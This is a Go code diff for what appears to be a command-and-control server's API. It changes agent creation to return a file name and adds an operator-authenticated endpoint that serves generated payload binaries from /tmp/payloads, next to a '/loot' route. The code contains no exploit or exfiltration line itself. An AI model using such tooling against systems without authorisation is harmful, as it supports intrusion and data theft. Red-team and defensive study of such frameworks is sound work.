@@ -3,8 +3,10 @@ package api
 import (
 	"encoding/base64"
 	"encoding/json"
+	"fmt"
 	"net/http"
 	"os"
+	"path/filepath"
 	"strconv"
 	"time"
 
@@ -256,12 +258,36 @@ func StartServer(port int) error {
 
 		agentData.Listener = address
 
-		binaryPath, err := agentsService.CreateAgent(agentData)
+		fileName, err := agentsService.CreateAgent(agentData)
 		if err != nil {
 			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 			return
 		}
-		c.JSON(http.StatusCreated, binaryPath)
+		c.JSON(http.StatusCreated, gin.H{"file": fileName})
+	})
+
+	router.GET("/agents/download", HttpAuth(config.GetConfig().JWTSecret, *operatorsRepository), func(c *gin.Context) {
+		agentName := c.Query("name")
+
+		safeFilename := filepath.Base(agentName)
+		if safeFilename == "." || safeFilename == "/" {
+			c.JSON(400, gin.H{"error": "Invalid filename"})
+			return
+		}
+
+		filePath := filepath.Join("/tmp/payloads", safeFilename)
+
+		if _, err := os.Stat(filePath); os.IsNotExist(err) {
+			c.JSON(404, gin.H{"error": "File not found or expired"})
+			return
+		}
+
+		c.Header("Content-Description", "File Transfer")
+		c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", safeFilename))
+		c.Header("Content-Type", "application/octet-stream")
+		c.Header("Content-Transfer-Encoding", "binary")
+
+		c.File(filePath)
 	})
 
 	router.GET("/loot", HttpAuth(config.GetConfig().JWTSecret, *operatorsRepository), func(c *gin.Context) {
